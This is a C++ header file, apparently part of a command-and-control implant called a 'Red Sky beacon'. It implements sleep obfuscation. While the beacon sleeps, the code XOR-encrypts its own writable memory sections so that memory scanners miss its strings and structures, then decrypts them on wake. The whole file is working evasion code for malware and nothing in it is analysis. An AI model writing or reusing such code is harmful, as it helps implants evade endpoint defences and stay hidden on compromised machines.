// language: C++, file: sleep_mask.hpp, target: Red Sky beacon — sleep obfuscation
// During sleep, XOR-encrypt the writable sections of our own image so a memory
// scanner doesn't find plaintext strings or beacon structures. Restore on wake.

#pragma once
#include <windows.h>
#include <cstdint>
#include <vector>

namespace rs { namespace sleepmask {

struct Region {
    BYTE* addr;
    DWORD size;
};

inline std::vector<Region> collect_writable_sections() {
    std::vector<Region> regions;
    HMODULE self = GetModuleHandleW(nullptr);
    if (!self) return regions;

    auto dos = (IMAGE_DOS_HEADER*)self;
    auto nt  = (IMAGE_NT_HEADERS*)((BYTE*)self + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) {
            BYTE* p = (BYTE*)self + sec->VirtualAddress;
            DWORD sz = sec->Misc.VirtualSize;
            if (sz == 0) continue;
            DWORD old;
            if (VirtualProtect(p, sz, PAGE_READWRITE, &old)) {
                regions.push_back({p, sz});
            }
        }
    }
    return regions;
}

inline void xor_region(BYTE* p, DWORD sz, const BYTE* key, size_t klen) {
    if (klen == 0) return;
    for (DWORD i = 0; i < sz; ++i) {
        p[i] ^= key[i % klen];
    }
}

inline void sleep_masked(DWORD ms, const BYTE* key, size_t klen) {
    auto regions = collect_writable_sections();
    for (auto& r : regions) xor_region(r.addr, r.size, key, klen);
    Sleep(ms);
    for (auto& r : regions) xor_region(r.addr, r.size, key, klen);
}

}} // namespace rs::sleepmask
